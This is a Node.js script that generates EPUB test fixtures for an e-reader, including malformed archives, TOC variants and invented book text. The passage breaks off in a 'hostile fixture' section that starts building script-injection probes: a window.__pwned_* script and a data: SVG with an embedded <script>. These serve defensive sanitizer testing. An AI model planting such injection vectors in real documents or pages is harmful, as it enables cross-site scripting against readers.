// Regenerates the committed EPUB fixtures in test/fixtures/epub/.
// All book text is invented for this project. The writer keeps the OCF rule:
// the mimetype entry is first in the archive and stored (method 0).
import { mkdirSync, writeFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { crc32, deflateRawSync, deflateSync } from 'node:zlib';

const outDir = dirname(fileURLToPath(import.meta.url));
mkdirSync(outDir, { recursive: true });

// --- byte-level zip writer -------------------------------------------------

function u16(v) {
  const b = Buffer.alloc(2);
  b.writeUInt16LE(v);
  return b;
}
function u32(v) {
  const b = Buffer.alloc(4);
  b.writeUInt32LE(v);
  return b;
}

// entries: { name, data, method?: 0|8, encrypted? }
function buildZip(entries) {
  const parts = [];
  const central = [];
  let offset = 0;

  for (const entry of entries) {
    const method = entry.method ?? 8;
    const nameBytes = Buffer.from(entry.name, 'utf-8');
    const raw = Buffer.from(entry.data);
    const payload = entry.encrypted
      ? Buffer.from(raw.map((b, i) => (b ^ (i * 29 + 7)) & 0xff))
      : method === 8
        ? deflateRawSync(raw)
        : raw;
    const crc = crc32(raw) >>> 0;
    const flags = entry.encrypted ? 0x0001 : 0;
    const localHeaderOffset = offset;

    const local = Buffer.concat([
      u32(0x04034b50), u16(20), u16(flags), u16(method), u32(0),
      u32(crc), u32(payload.length), u32(raw.length),
      u16(nameBytes.length), u16(0), nameBytes,
    ]);
    parts.push(local, payload);
    offset += local.length + payload.length;

    central.push(
      Buffer.concat([
        u32(0x02014b50), u16(20), u16(20), u16(flags), u16(method), u32(0),
        u32(crc), u32(payload.length), u32(raw.length),
        u16(nameBytes.length), u16(0), u16(0), u16(0), u16(0), u32(0),
        u32(localHeaderOffset), nameBytes,
      ]),
    );
  }

  const cd = Buffer.concat(central);
  const cdOffset = offset;
  parts.push(cd);
  parts.push(
    Buffer.concat([
      u32(0x06054b50), u16(0), u16(0), u16(entries.length), u16(entries.length),
      u32(cd.length), u32(cdOffset), u16(0),
    ]),
  );
  return Buffer.concat(parts);
}

// --- a real 1x1 PNG --------------------------------------------------------

function pngChunk(type, data) {
  const typeBytes = Buffer.from(type, 'latin1');
  const length = Buffer.alloc(4);
  length.writeUInt32BE(data.length);
  const crc = Buffer.alloc(4);
  crc.writeUInt32BE(crc32(Buffer.concat([typeBytes, data])) >>> 0);
  return Buffer.concat([length, typeBytes, data, crc]);
}

function makePng(r, g, b) {
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(1, 0);
  ihdr.writeUInt32BE(1, 4);
  ihdr[8] = 8;
  ihdr[9] = 2;
  const idat = deflateSync(Buffer.from([0, r, g, b]));
  return Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    pngChunk('IHDR', ihdr),
    pngChunk('IDAT', idat),
    pngChunk('IEND', Buffer.alloc(0)),
  ]);
}

// A solid-colour PNG of an arbitrary declared size. Used for the oversized-image
// fixture: intrinsic width far past any column so an uncapped <img> would overflow.
function makeSolidPng(width, height, r, g, b) {
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(width, 0);
  ihdr.writeUInt32BE(height, 4);
  ihdr[8] = 8;
  ihdr[9] = 2;
  const rowBytes = width * 3;
  const raw = Buffer.alloc((rowBytes + 1) * height);
  for (let y = 0; y < height; y += 1) {
    const rowStart = y * (rowBytes + 1);
    raw[rowStart] = 0;
    for (let x = 0; x < width; x += 1) {
      const p = rowStart + 1 + x * 3;
      raw[p] = r;
      raw[p + 1] = g;
      raw[p + 2] = b;
    }
  }
  const idat = deflateSync(raw);
  return Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    pngChunk('IHDR', ihdr),
    pngChunk('IDAT', idat),
    pngChunk('IEND', Buffer.alloc(0)),
  ]);
}

// --- shared content --------------------------------------------------------

const MIMETYPE = 'application/epub+zip';

const containerXml = (opfPath) => `<?xml version="1.0" encoding="UTF-8"?>
<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
  <rootfiles>
    <rootfile full-path="${opfPath}" media-type="application/oebps-package+xml"/>
  </rootfiles>
</container>
`;

const xhtml = (title, body) => `<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>${title}</title><link rel="stylesheet" type="text/css" href="style.css"/></head>
<body>
<h1>${title}</h1>
<p>${body}</p>
</body>
</html>
`;

const styleCss = 'body { font-family: serif; margin: 1em; }\n';

// --- EPUB2 fixture ---------------------------------------------------------

const epub2Opf = `<?xml version="1.0" encoding="UTF-8"?>
<package xmlns="http://www.idpf.org/2007/opf" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:opf="http://www.idpf.org/2007/opf" version="2.0" unique-identifier="uid">
  <metadata>
    <dc:identifier id="uid">urn:uuid:6f1d4b6e-2a51-4c3e-9a77-0f2b8c1de901</dc:identifier>
    <dc:title>The Cartographer&apos;s Tide</dc:title>
    <dc:creator opf:role="aut">Mira Voss</dc:creator>
    <dc:language>en</dc:language>
    <meta name="cover" content="cover-image"/>
  </metadata>
  <manifest>
    <item id="ncx" href="toc.ncx" media-type="application/x-dtbncx+xml"/>
    <item id="cover-image" href="cover.png" media-type="image/png"/>
    <item id="cover-page" href="cover.xhtml" media-type="application/xhtml+xml"/>
    <item id="chapter-1" href="chapter-1.xhtml" media-type="application/xhtml+xml"/>
    <item id="chapter-2" href="chapter-2.xhtml" media-type="application/xhtml+xml"/>
    <item id="style" href="style.css" media-type="text/css"/>
  </manifest>
  <spine toc="ncx">
    <itemref idref="cover-page" linear="no"/>
    <itemref idref="chapter-1"/>
    <itemref idref="chapter-2"/>
  </spine>
  <guide>
    <reference type="cover" title="Cover" href="cover.xhtml"/>
    <reference type="text" title="Beginning" href="chapter-1.xhtml"/>
  </guide>
</package>
`;

const epub2Ncx = `<?xml version="1.0" encoding="UTF-8"?>
<ncx xmlns="http://www.daisy.org/z3986/2005/ncx/" version="2005-1">
  <head><meta name="dtb:uid" content="urn:uuid:6f1d4b6e-2a51-4c3e-9a77-0f2b8c1de901"/></head>
  <docTitle><text>The Cartographer's Tide</text></docTitle>
  <navMap>
    <navPoint id="np-1" playOrder="1"><navLabel><text>Soundings</text></navLabel><content src="chapter-1.xhtml"/></navPoint>
    <navPoint id="np-2" playOrder="2"><navLabel><text>Dead Reckoning</text></navLabel><content src="chapter-2.xhtml"/></navPoint>
  </navMap>
</ncx>
`;

const epub2Entries = [
  { name: 'mimetype', data: MIMETYPE, method: 0 },
  { name: 'META-INF/container.xml', data: containerXml('content.opf') },
  { name: 'content.opf', data: epub2Opf },
  { name: 'toc.ncx', data: epub2Ncx },
  { name: 'cover.png', data: makePng(20, 60, 110), method: 0 },
  { name: 'cover.xhtml', data: xhtml('The Cartographer&#8217;s Tide', 'By Mira Voss.') },
  {
    name: 'chapter-1.xhtml',
    data: xhtml('Soundings', 'The harbour charts were wrong by a fathom, and Nell knew it before the lead line did.'),
  },
  {
    name: 'chapter-2.xhtml',
    data: xhtml('Dead Reckoning', 'She drew the coastline from memory, and the memory held where the compass had not.'),
  },
  { name: 'style.css', data: styleCss },
];

writeFileSync(join(outDir, 'epub2.epub'), buildZip(epub2Entries));

// --- EPUB3 fixture ---------------------------------------------------------

const epub3Opf = `<?xml version="1.0" encoding="UTF-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="uid" xml:lang="en">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:identifier id="uid">urn:uuid:98b2ac6f-7d40-45f9-8ea1-33c5d0be2417</dc:identifier>
    <dc:title>Salt Meridian</dc:title>
    <dc:creator id="creator">Ilya Kovar</dc:creator>
    <dc:language>en-US</dc:language>
    <meta refines="#creator" property="role" scheme="marc:relators">aut</meta>
    <meta property="dcterms:modified">2026-08-24T00:00:00Z</meta>
  </metadata>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="cover-image" href="cover.png" media-type="image/png" properties="cover-image"/>
    <item id="c1" href="chapter-1.xhtml" media-type="application/xhtml+xml"/>
    <item id="c2" href="chapter-2.xhtml" media-type="application/xhtml+xml"/>
    <item id="c3" href="chapter-3.xhtml" media-type="application/xhtml+xml"/>
    <item id="style" href="style.css" media-type="text/css"/>
  </manifest>
  <spine>
    <itemref idref="c1"/>
    <itemref idref="c2"/>
    <itemref idref="c3"/>
  </spine>
</package>
`;

const epub3Nav = `<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
<head><title>Salt Meridian</title></head>
<body>
<nav epub:type="toc">
<h1>Contents</h1>
<ol>
<li><a href="chapter-1.xhtml">The Brine Ledger</a></li>
<li><a href="chapter-2.xhtml">Forty Degrees of Longing</a></li>
<li><a href="chapter-3.xhtml">The Meridian Keeper</a></li>
</ol>
</nav>
</body>
</html>
`;

const epub3Entries = [
  { name: 'mimetype', data: MIMETYPE, method: 0 },
  { name: 'META-INF/container.xml', data: containerXml('content.opf') },
  { name: 'content.opf', data: epub3Opf },
  { name: 'nav.xhtml', data: epub3Nav },
  { name: 'cover.png', data: makePng(140, 40, 30), method: 0 },
  {
    name: 'chapter-1.xhtml',
    data: xhtml('The Brine Ledger', 'Every cask that left the flats was written twice: once in ink, once in salt.'),
  },
  {
    name: 'chapter-2.xhtml',
    data: xhtml('Forty Degrees of Longing', 'The survey ship idled a week at anchor while its clocks argued about noon.'),
  },
  {
    name: 'chapter-3.xhtml',
    data: xhtml('The Meridian Keeper', 'Odile kept the line on maps no one printed anymore, and it kept her back.'),
  },
  { name: 'style.css', data: styleCss },
];

writeFileSync(join(outDir, 'epub3.epub'), buildZip(epub3Entries));

// --- deviation: trailing newline in mimetype -------------------------------

writeFileSync(
  join(outDir, 'mimetype-newline.epub'),
  buildZip([
    { name: 'mimetype', data: MIMETYPE + '\n', method: 0 },
    ...epub2Entries.slice(1),
  ]),
);

// --- corrupt containers (all sniff as EPUBs) -------------------------------

const minimalOpf = `<?xml version="1.0" encoding="UTF-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="2.0" unique-identifier="uid">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:identifier id="uid">urn:uuid:0</dc:identifier>
    <dc:title>Stub</dc:title>
  </metadata>
  <manifest><item id="c1" href="chapter-1.xhtml" media-type="application/xhtml+xml"/></manifest>
  <spine><itemref idref="c1"/></spine>
</package>
`;
const chapterStub = xhtml('Stub', 'Stub chapter.');
const mimetypeEntry = { name: 'mimetype', data: MIMETYPE, method: 0 };

writeFileSync(
  join(outDir, 'no-container.epub'),
  buildZip([mimetypeEntry, { name: 'content.opf', data: minimalOpf }, { name: 'chapter-1.xhtml', data: chapterStub }]),
);

writeFileSync(
  join(outDir, 'container-not-xml.epub'),
  buildZip([
    mimetypeEntry,
    { name: 'META-INF/container.xml', data: '<container><rootfiles></container>' },
    { name: 'content.opf', data: minimalOpf },
  ]),
);

writeFileSync(
  join(outDir, 'container-no-rootfile.epub'),
  buildZip([
    mimetypeEntry,
    {
      name: 'META-INF/container.xml',
      data: '<?xml version="1.0"?>\n<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles/></container>',
    },
    { name: 'content.opf', data: minimalOpf },
  ]),
);

writeFileSync(
  join(outDir, 'missing-opf.epub'),
  buildZip([
    mimetypeEntry,
    { name: 'META-INF/container.xml', data: containerXml('content.opf') },
    { name: 'chapter-1.xhtml', data: chapterStub },
  ]),
);

writeFileSync(
  join(outDir, 'opf-not-xml.epub'),
  buildZip([
    mimetypeEntry,
    { name: 'META-INF/container.xml', data: containerXml('content.opf') },
    { name: 'content.opf', data: '<package version="2.0"><metadata></manifest></package>' },
    { name: 'chapter-1.xhtml', data: chapterStub },
  ]),
);

writeFileSync(
  join(outDir, 'opf-no-spine.epub'),
  buildZip([
    mimetypeEntry,
    { name: 'META-INF/container.xml', data: containerXml('content.opf') },
    {
      name: 'content.opf',
      data: '<?xml version="1.0"?>\n<package xmlns="http://www.idpf.org/2007/opf" version="2.0"><metadata/><manifest/></package>',
    },
  ]),
);

writeFileSync(
  join(outDir, 'encrypted.epub'),
  buildZip([
    mimetypeEntry,
    { name: 'META-INF/container.xml', data: containerXml('content.opf'), encrypted: true },
    { name: 'content.opf', data: minimalOpf, encrypted: true },
    { name: 'chapter-1.xhtml', data: chapterStub, encrypted: true },
  ]),
);

// --- TOC fixtures ----------------------------------------------------------

const tocChapters = [
  { name: 'part-1.xhtml', data: xhtml('Landfall', 'The island kept its own hours.') },
  { name: 'part-2.xhtml', data: xhtml('Interior', 'Past the mangroves the map went quiet.') },
  { name: 'part-3.xhtml', data: xhtml('Departure', 'No one watched the boat leave twice.') },
];

const tocManifestItems = (extra) => `
    ${extra}
    <item id="p1" href="part-1.xhtml" media-type="application/xhtml+xml"/>
    <item id="p2" href="part-2.xhtml" media-type="application/xhtml+xml"/>
    <item id="p3" href="part-3.xhtml" media-type="application/xhtml+xml"/>`;

const tocOpf = (version, manifestExtra, spineAttrs) => `<?xml version="1.0" encoding="UTF-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="${version}" unique-identifier="uid">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:identifier id="uid">urn:uuid:11111111-2222-3333-4444-555555555555</dc:identifier>
    <dc:title>Tidal Atlas</dc:title>
    <dc:language>en</dc:language>
  </metadata>
  <manifest>${tocManifestItems(manifestExtra)}
  </manifest>
  <spine${spineAttrs}>
    <itemref idref="p1"/>
    <itemref idref="p2"/>
    <itemref idref="p3"/>
  </spine>
</package>
`;

const tocNavDoc = `<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
<head><title>Tidal Atlas</title></head>
<body>
<nav epub:type="landmarks"><ol><li><a epub:type="bodymatter" href="part-1.xhtml">Start</a></li></ol></nav>
<nav epub:type="toc">
<h1>Contents</h1>
<ol>
<li><a href="part-1.xhtml">Landfall</a>
<ol>
<li><a href="part-1.xhtml#tide-tables">Tide&nbsp;Tables</a></li>
<li><a href="part-2.xhtml">The <i>Inner</i> Passage</a></li>
</ol>
</li>
<li><span>Appendices</span>
<ol>
<li><a href="part-3.xhtml#gazetteer">Gazetteer</a></li>
</ol>
</li>
</ol>
</nav>
</body>
</html>
`;

const tocNcx = (labelPrefix) => `<?xml version="1.0" encoding="UTF-8"?>
<ncx xmlns="http://www.daisy.org/z3986/2005/ncx/" version="2005-1">
  <head><meta name="dtb:uid" content="urn:uuid:11111111-2222-3333-4444-555555555555"/></head>
  <docTitle><text>Tidal Atlas</text></docTitle>
  <navMap>
    <navPoint id="n1" playOrder="1"><navLabel><text>${labelPrefix}Landfall</text></navLabel><content src="part-1.xhtml"/>
      <navPoint id="n1a" playOrder="2"><navLabel><text>${labelPrefix}Moorings</text></navLabel><content src="part-1.xhtml#moorings"/></navPoint>
    </navPoint>
    <navPoint id="n2" playOrder="3"><navLabel><text>${labelPrefix}Interior</text></navLabel><content src="part-2.xhtml"/></navPoint>
    <navPoint id="n3" playOrder="4"><navLabel><text>${labelPrefix}Departure</text></navLabel><content src="part-3.xhtml"/></navPoint>
  </navMap>
</ncx>
`;

writeFileSync(
  join(outDir, 'toc-nav.epub'),
  buildZip([
    mimetypeEntry,
    { name: 'META-INF/container.xml', data: containerXml('content.opf') },
    {
      name: 'content.opf',
      data: tocOpf('3.0', '<item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>', ''),
    },
    { name: 'nav.xhtml', data: tocNavDoc },
    ...tocChapters,
  ]),
);

writeFileSync(
  join(outDir, 'toc-ncx.epub'),
  buildZip([
    mimetypeEntry,
    { name: 'META-INF/container.xml', data: containerXml('content.opf') },
    {
      name: 'content.opf',
      data: tocOpf('2.0', '<item id="ncx" href="toc.ncx" media-type="application/x-dtbncx+xml"/>', ' toc="ncx"'),
    },
    { name: 'toc.ncx', data: tocNcx('') },
    ...tocChapters,
  ]),
);

writeFileSync(
  join(outDir, 'toc-both.epub'),
  buildZip([
    mimetypeEntry,
    { name: 'META-INF/container.xml', data: containerXml('content.opf') },
    {
      name: 'content.opf',
      data: tocOpf(
        '3.0',
        '<item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>\n    <item id="ncx" href="toc.ncx" media-type="application/x-dtbncx+xml"/>',
        ' toc="ncx"',
      ),
    },
    { name: 'nav.xhtml', data: tocNavDoc },
    { name: 'toc.ncx', data: tocNcx('NCX ') },
    ...tocChapters,
  ]),
);

// --- OPF in a subdirectory, ../ and percent-encoded hrefs ------------------

const subdirOpf = `<?xml version="1.0" encoding="UTF-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="uid">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:identifier id="uid">urn:uuid:66666666-7777-8888-9999-000000000000</dc:identifier>
    <dc:title>Harbour of Glass</dc:title>
    <dc:language>en</dc:language>
  </metadata>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="cover-image" href="./images/../images/cover.png" media-type="image/png" properties="cover-image"/>
    <item id="plate" href="images/sea%20glass.png" media-type="image/png"/>
    <item id="ghost" href="images/absent.png" media-type="image/png"/>
    <item id="intro" href="text/first%20light.xhtml" media-type="application/xhtml+xml"/>
    <item id="middle" href="text/middle.xhtml" media-type="application/xhtml+xml"/>
    <item id="style" href="styles/main.css" media-type="text/css"/>
  </manifest>
  <spine>
    <itemref idref="intro"/>
    <itemref idref="middle"/>
  </spine>
</package>
`;

const subdirNav = `<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
<head><title>Harbour of Glass</title></head>
<body>
<nav epub:type="toc">
<ol>
<li><a href="text/first%20light.xhtml">First Light</a></li>
<li><a href="text/middle.xhtml#anchor">Midway</a></li>
</ol>
</nav>
</body>
</html>
`;

// The chapter sits two directories away from the OPF and reaches everything
// through ../, so section-relative resolution is what this document tests.
// images/absent.png is declared in the manifest but deliberately never written.
const subdirMiddle = `<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>Midway</title><link rel="stylesheet" type="text/css" href="../styles/main.css"/></head>
<body>
<h1 id="anchor">Midway</h1>
<p>Halfway across, the ferry lost its shadow.</p>
<img src="../images/sea%20glass.png" alt="A shard of sea glass"/>
<img src="../images/absent.png" alt="M"/>
<img src="https://example.invalid/elsewhere.png" alt="Elsewhere"/>
<p><a href="../text/first%20light.xhtml">Back to first light</a> — <a href="#anchor">top</a></p>
</body>
</html>
`;

writeFileSync(
  join(outDir, 'opf-subdir.epub'),
  buildZip([
    mimetypeEntry,
    { name: 'META-INF/container.xml', data: containerXml('OEBPS/content.opf') },
    { name: 'OEBPS/content.opf', data: subdirOpf },
    { name: 'OEBPS/nav.xhtml', data: subdirNav },
    { name: 'OEBPS/images/cover.png', data: makePng(10, 90, 70), method: 0 },
    { name: 'OEBPS/images/sea glass.png', data: makePng(60, 130, 120), method: 0 },
    { name: 'OEBPS/text/first light.xhtml', data: xhtml('First Light', 'The glassworks woke before the gulls did.') },
    { name: 'OEBPS/text/middle.xhtml', data: subdirMiddle },
    { name: 'OEBPS/styles/main.css', data: styleCss },
  ]),
);

// --- manifest fallback chains ----------------------------------------------

const fallbackOpf = (chain) => `<?xml version="1.0" encoding="UTF-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="uid">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:identifier id="uid">urn:uuid:aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee</dc:identifier>
    <dc:title>Ledger of Rooms</dc:title>
    <dc:language>en</dc:language>
  </metadata>
  <manifest>
${chain}
    <item id="plain" href="chapter.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine>
    <itemref idref="exotic"/>
    <itemref idref="plain"/>
  </spine>
</package>
`;

writeFileSync(
  join(outDir, 'fallback.epub'),
  buildZip([
    mimetypeEntry,
    { name: 'META-INF/container.xml', data: containerXml('content.opf') },
    {
      name: 'content.opf',
      data: fallbackOpf(`    <item id="exotic" href="rooms.slate" media-type="application/x-slate" fallback="less-exotic"/>
    <item id="less-exotic" href="rooms.tiles" media-type="application/x-tiles" fallback="usable"/>
    <item id="usable" href="rooms.xhtml" media-type="application/xhtml+xml"/>`),
    },
    { name: 'rooms.slate', data: 'not renderable\n' },
    { name: 'rooms.tiles', data: 'still not renderable\n' },
    { name: 'rooms.xhtml', data: xhtml('Ledger of Rooms', 'Every room was let twice: once to a lodger, once to a rumour.') },
    { name: 'chapter.xhtml', data: xhtml('Ordinary Chapter', 'The rent was due on the rumour too.') },
  ]),
);

writeFileSync(
  join(outDir, 'fallback-circular.epub'),
  buildZip([
    mimetypeEntry,
    { name: 'META-INF/container.xml', data: containerXml('content.opf') },
    {
      name: 'content.opf',
      data: fallbackOpf(`    <item id="exotic" href="rooms.slate" media-type="application/x-slate" fallback="less-exotic"/>
    <item id="less-exotic" href="rooms.tiles" media-type="application/x-tiles" fallback="exotic"/>`),
    },
    { name: 'rooms.slate', data: 'not renderable\n' },
    { name: 'rooms.tiles', data: 'still not renderable\n' },
    { name: 'chapter.xhtml', data: xhtml('Ordinary Chapter', 'Unreachable behind the circular chain.') },
  ]),
);

// --- manifest properties: nav / cover-image / scripted ---------------------

const propertiesOpf = `<?xml version="1.0" encoding="UTF-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="uid">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:identifier id="uid">urn:uuid:12121212-3434-5656-7878-909090909090</dc:identifier>
    <dc:title>The Annotated Orrery</dc:title>
    <dc:language>en</dc:language>
  </metadata>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="cover-image" href="cover.png" media-type="image/png" properties="cover-image"/>
    <item id="static" href="static.xhtml" media-type="application/xhtml+xml"/>
    <item id="interactive" href="interactive.xhtml" media-type="application/xhtml+xml" properties="scripted"/>
  </manifest>
  <spine>
    <itemref idref="static"/>
    <itemref idref="interactive"/>
  </spine>
</package>
`;

const propertiesNav = `<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
<head><title>The Annotated Orrery</title></head>
<body>
<nav epub:type="toc">
<ol>
<li><a href="static.xhtml">The Fixed Stars</a></li>
<li><a href="interactive.xhtml">The Moving Parts</a></li>
</ol>
</nav>
</body>
</html>
`;

writeFileSync(
  join(outDir, 'properties.epub'),
  buildZip([
    mimetypeEntry,
    { name: 'META-INF/container.xml', data: containerXml('content.opf') },
    { name: 'content.opf', data: propertiesOpf },
    { name: 'nav.xhtml', data: propertiesNav },
    { name: 'cover.png', data: makePng(200, 170, 40), method: 0 },
    { name: 'static.xhtml', data: xhtml('The Fixed Stars', 'The brass planets never argued about precedence.') },
    { name: 'interactive.xhtml', data: xhtml('The Moving Parts', 'Turn the crank and the year comes loose.') },
  ]),
);

// --- RTL spine and fixed-layout metadata -----------------------------------

const rtlOpf = `<?xml version="1.0" encoding="UTF-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="uid">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:identifier id="uid">urn:uuid:abababab-cdcd-efef-0101-232323232323</dc:identifier>
    <dc:title>مرايا الميناء</dc:title>
    <dc:language>ar</dc:language>
  </metadata>
  <manifest>
    <item id="c1" href="chapter-1.xhtml" media-type="application/xhtml+xml"/>
    <item id="c2" href="chapter-2.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine page-progression-direction="rtl">
    <itemref idref="c1"/>
    <itemref idref="c2"/>
  </spine>
</package>
`;

writeFileSync(
  join(outDir, 'rtl.epub'),
  buildZip([
    mimetypeEntry,
    { name: 'META-INF/container.xml', data: containerXml('content.opf') },
    { name: 'content.opf', data: rtlOpf },
    { name: 'chapter-1.xhtml', data: xhtml('One', 'First invented chapter.') },
    { name: 'chapter-2.xhtml', data: xhtml('Two', 'Second invented chapter.') },
  ]),
);

const fixedLayoutOpf = `<?xml version="1.0" encoding="UTF-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="uid" prefix="rendition: http://www.idpf.org/vocab/rendition/#">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:identifier id="uid">urn:uuid:45454545-6767-8989-0a0a-bcbcbcbcbcbc</dc:identifier>
    <dc:title>Plates of the Deep</dc:title>
    <dc:language>en</dc:language>
    <meta property="rendition:layout">pre-paginated</meta>
    <meta property="rendition:orientation">landscape</meta>
  </metadata>
  <manifest>
    <item id="p1" href="plate-1.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine>
    <itemref idref="p1"/>
  </spine>
</package>
`;

writeFileSync(
  join(outDir, 'fixed-layout.epub'),
  buildZip([
    mimetypeEntry,
    { name: 'META-INF/container.xml', data: containerXml('content.opf') },
    { name: 'content.opf', data: fixedLayoutOpf },
    { name: 'plate-1.xhtml', data: xhtml('Plate I', 'A single fixed plate of invented sea life.') },
  ]),
);

// --- search anchors: capture must match what the frame shows ----------------
//
// One searchable phrase interrupted by BOTH transformations the sanitize +
// resource pipeline applies before text reaches the frame: a drop-cap <img>
// whose alt text is substituted (declared in the manifest, deliberately absent
// from the archive, so Section.resolve() returns undefined), and a form control
// the sanitizer discards with everything inside it. The frame shows
// "The tide ledger never forgave a missing entry", and a search hit spanning
// that whole run must capture an anchor that resolves there — the canonical
// reading-text model shared by src/search and src/view.

const searchAnchorsLedger = `<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>The Tide Ledger</title></head>
<body>
<h1>The Tide Ledger</h1>
<p>The clerk ruled his columns before the fleet was awake.</p>
<p class="first"><img class="dropcap" src="images/dropcap-t.png" alt="T"/>he tide ledger never<textarea rows="1" cols="12">FORM_NOISE_NOT_PROSE</textarea> forgave a missing entry, and the harbour clerk knew it.</p>
<p>He kept the pencil behind his ear and the truth in the margin.</p>
</body>
</html>
`;

const searchAnchorsOpf = `<?xml version="1.0" encoding="UTF-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="uid" xml:lang="en">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:identifier id="uid">urn:uuid:7b9d2c44-1e6f-4a02-9c58-3f8e5d1a6b70</dc:identifier>
    <dc:title>The Tide Ledger</dc:title>
    <dc:language>en</dc:language>
    <meta property="dcterms:modified">2026-08-26T00:00:00Z</meta>
  </metadata>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="opening" href="opening.xhtml" media-type="application/xhtml+xml"/>
    <item id="ledger" href="ledger.xhtml" media-type="application/xhtml+xml"/>
    <item id="image-dropcap" href="images/dropcap-t.png" media-type="image/png"/>
  </manifest>
  <spine>
    <itemref idref="opening"/>
    <itemref idref="ledger"/>
  </spine>
</package>
`;

const searchAnchorsNav = `<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
<head><title>The Tide Ledger</title></head>
<body>
<nav epub:type="toc">
<ol>
<li><a href="opening.xhtml">A Quiet Opening</a></li>
<li><a href="ledger.xhtml">The Tide Ledger</a></li>
</ol>
</nav>
</body>
</html>
`;

const searchAnchorsOpening = `<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>A Quiet Opening</title></head>
<body>
<h1>A Quiet Opening</h1>
<p>Nothing here is searched for; the target phrase lives in the next section so a jump must actually travel.</p>
</body>
</html>
`;

writeFileSync(
  join(outDir, 'search-anchors.epub'),
  buildZip([
    mimetypeEntry,
    { name: 'META-INF/container.xml', data: containerXml('content.opf') },
    { name: 'content.opf', data: searchAnchorsOpf },
    { name: 'nav.xhtml', data: searchAnchorsNav },
    { name: 'opening.xhtml', data: searchAnchorsOpening },
    { name: 'ledger.xhtml', data: searchAnchorsLedger },
    // images/dropcap-t.png is declared above and deliberately not written: the
    // unresolvable drop cap is what forces the alt substitution.
  ]),
);

// --- non-EPUB inputs -------------------------------------------------------

writeFileSync(
  join(outDir, 'not-epub.zip'),
  buildZip([
    { name: 'readme.txt', data: 'Just an ordinary archive, nothing bookish about it.\n' },
    { name: 'notes/day-one.txt', data: 'The ferry left at dawn.\n' },
  ]),
);

writeFileSync(
  join(outDir, 'wrong-mimetype.epub'),
  buildZip([
    { name: 'mimetype', data: 'text/plain', method: 0 },
    { name: 'META-INF/container.xml', data: containerXml('content.opf') },
    { name: 'content.opf', data: minimalOpf },
  ]),
);

// --- hostile fixture -------------------------------------------------------
//
// Every construct the sandboxed content host must neutralize, plus the benign
// ones it must keep. Two rules make the fixture provable rather than merely
// suggestive:
//   * Remote references use the reserved .invalid TLD, so no test can ever
//     reach a real host.
//   * The attack sections deliberately omit properties="scripted". Sanitization
//     is unconditional, and a fixture whose script all sat behind the declared
//     property could not prove that. One control section declares it.
// Every vector carries a distinct __pwned_* probe so one failure cannot mask
// another, and hostile-vectors.json is checked against the emitted bytes below.

const hostileScript = 'window.__pwned_external_script = 1;\n';

const dataSvg = (probe) =>
  'data:image/svg+xml;base64,' +
  Buffer.from(
    '<svg xmlns="http://www.w3.org/2000/svg"><script>window.' +
